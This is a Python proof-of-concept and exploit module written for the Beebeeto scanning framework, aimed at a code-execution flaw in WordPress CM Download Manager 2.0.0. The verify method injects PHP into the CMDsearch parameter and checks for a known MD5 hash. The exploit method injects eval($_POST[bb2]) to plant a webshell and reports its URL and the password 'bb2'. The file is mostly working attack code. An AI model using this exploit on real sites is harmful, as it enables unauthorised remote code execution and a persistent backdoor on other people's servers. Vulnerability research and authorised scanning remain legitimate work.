#!/usr/bin/env python
# coding=utf-8

"""
Site: http://www.beebeeto.com/
Framework: https://github.com/n0tr00t/Beebeeto-framework
"""

import re
import urllib
import urllib2

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0155',
            'name': 'WordPress CM Download Manager 2.0.0 代码执行漏洞 POC & Exploit',
            'author': 'foundu',
            'create_date': '2014-11-21',
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',
            'port': [80],
            'layer4_protocol': ['tcp'],
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'WordPress',
            'vul_version': ['2.0.0'],
            'type': 'Code Execution',
            'tag': ['WordPress漏洞', 'CM Download Manager漏洞', '代码执行漏洞', 'php'],
            'desc': '''
                    The code injection vulnerability has been found and confirmed within the software as an
                    anonymous user. A successful attack could allow an anonymous attacker gains full control
                    of the application and the ability to use any operating system functions that are available
                    to the scripting environment. 
                    ''',
            'references': ['http://1337day.com/exploit/22907',
            ],
        },
    }


    @classmethod
    def verify(cls, args):
        verify_url = args['options']['target'] + '/cmdownloads/?CMDsearch=".md5(bb2)."'
        response = urllib2.urlopen(verify_url)
        content = response.read()
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        match = re.search('0c72305dbeb0ed430b79ec9fc5fe8505', content)
        if match:
            args['success'] = True
            args['poc_ret']['vul_url'] = verify_url
        return args

    @classmethod
    def exploit(cls, args):
        verify_url = args['options']['target'] + '/cmdownloads/?CMDsearch=".md5(bb2)|eval($_POST[bb2])."'
        response = urllib2.urlopen(verify_url)
        content = response.read()
        if args['options']['verbose']:
            print '[*] Request URL: ' + verify_url
        match = re.search('0c72305dbeb0ed430b79ec9fc5fe8505', content)
        if match:
            args['success'] = True
            args['poc_ret']['webshell'] = verify_url
            args['poc_ret']['password'] = 'bb2' 
        return args


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())